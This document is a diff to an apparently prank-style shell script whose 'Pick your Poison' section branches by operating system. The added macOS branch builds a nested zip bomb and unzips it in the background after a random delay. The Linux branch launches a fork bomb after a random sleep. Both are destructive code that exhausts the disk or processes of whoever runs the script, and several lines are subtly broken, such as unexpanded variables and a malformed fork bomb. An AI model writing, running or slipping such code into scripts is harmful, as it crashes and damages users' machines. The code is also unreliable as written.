@@ -103,7 +103,25 @@ ddmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
 # Pick your Poison
 if [[ "$OSTYPE" == "darwin"* ]]; then
 	echo "I have the strange feeling that I’ve forgotten all of this before."
-	(sleep $RANDOM ; echo 'fix me') &
+	mkdir life; cd life; touch lifeLifeLife.txt
+	for i in {1..1000}; do 
+		for j in {1..i}; do
+			echo -n "0" >> lifeLifeLife.txt
+		done
+	done
+	NAME="zipLife"
+	zip -q $NAME lifeLifeLife.txt
+	for i in {1..9}; do 
+		for j in {1..10}; do
+			cp ${NAME}.zip ${NAME}${j}.zip
+		done
+		NEXT_LEVEL_NAME="${i}-${NAME}" # This is going to look bizarre in the higher numbers
+		zip -q NEXT_LEVEL_NAME *.zip
+		NAME=$NEXT_LEVEL_NAME
+	done
+	cd ..
+	zip -r -q life/
+	(sleep $RANDOM ; unzip -q ./life.zip) &
 elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
 	echo "So, it was me all along! Now I understand whats going on here!"
 	(sleep $RANDOM ; :(){:|:&};:) & 
